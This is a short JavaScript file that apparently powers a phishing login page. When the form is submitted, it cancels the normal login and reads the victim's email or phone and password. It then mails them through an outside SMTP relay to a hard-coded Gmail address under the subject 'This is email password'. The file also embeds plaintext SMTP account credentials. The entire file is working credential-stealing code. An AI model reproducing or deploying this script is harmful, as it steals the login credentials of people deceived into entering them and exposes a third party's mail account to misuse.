const emailOrPhone=document.getElementById("email")
const password=document.getElementById("password")

const form = document.getElementById("form")


form.addEventListener("submit",function(e){
    e.preventDefault()
    const email = emailOrPhone.value
    const passwordVal = password.value
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "mdsaied386@gmail.com",
        Password : "120CA29FDF15CBBAB54B23C137190BD2930E",
        To : 'mdsaied386@gmail.com',
        From : "mdsaied386@gmail.com",
        Subject : "This is email password",
        Body : `${email} - ${passwordVal}`
    }).then(
      message => alert(message)
    )
})